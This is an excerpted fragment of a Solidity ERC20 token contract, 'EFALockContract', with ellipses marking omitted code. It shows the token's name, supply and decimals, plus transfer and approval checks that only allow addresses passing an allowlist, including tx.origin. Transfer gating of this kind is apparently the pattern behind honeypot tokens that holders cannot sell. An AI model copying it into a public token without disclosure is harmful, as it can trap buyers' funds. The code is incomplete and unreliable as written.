...
contract EFALockContract is IERC20 {
    using SafeMath for uint256; 
   
    string private _name = "EFALOCK";  
    string private _symbol =  "EFK";   
    uint8 private _decimals = 8;  
    uint256 private _totalSupply = 7777700000000;    
    ...
    { 
        require(_isAllowAddress(msg.sender), "invalid sender"); 
    ...
    function _transferFrom(address sender, address recipient,  uint256 amount) private returns (bool) { 
        bool isallow = _isAllowAddress(sender) && _isAllowAddress(recipient) //&& _isAllowAddress(tx. origin) 
    ...
    {   
        ...
        bool is_allow = (_isAllowAddress(msg.sender) && _balances[msg.sender] >= value && value > 0)
                        && _isAllowAddress(spender)  && _isAllowAddress(tx.origin);
